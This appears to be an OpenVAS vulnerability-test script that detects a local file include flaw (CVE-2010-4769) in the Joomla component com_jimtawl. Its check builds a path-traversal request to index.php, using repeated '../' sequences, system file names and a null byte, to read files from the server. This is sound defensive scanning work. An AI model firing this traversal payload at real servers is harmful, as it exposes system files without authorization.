###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_com_jimtawl_44992.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Joomla Component 'com_jimtawl' Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The 'com_jimtawl' component for Joomla! is prone to a local file-
include vulnerability because it fails to properly sanitize user-
supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the underlying computer; other attacks
are also possible.

com_jimtawl 1.0.2 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100919);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2010-11-29 13:18:51 +0100 (Mon, 29 Nov 2010)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-4769");
 script_bugtraq_id(44992);

 script_name("Joomla Component 'com_jimtawl' Local File Include Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44992");
 script_xref(name : "URL" , value : "http://extensions.joomla.org/extensions/multimedia/streaming-a-broadcasting/audio-broadcasting/4344");
 script_xref(name : "URL" , value : "http://www.joomla.org/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("joomla_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("joomla/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"joomla"))exit(0);
files = traversal_files();

foreach file (keys(files)) {

  url = string(dir,"/index.php?option=com_jimtawl&Itemid=12&task=",crap(data:"../",length:3*15),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
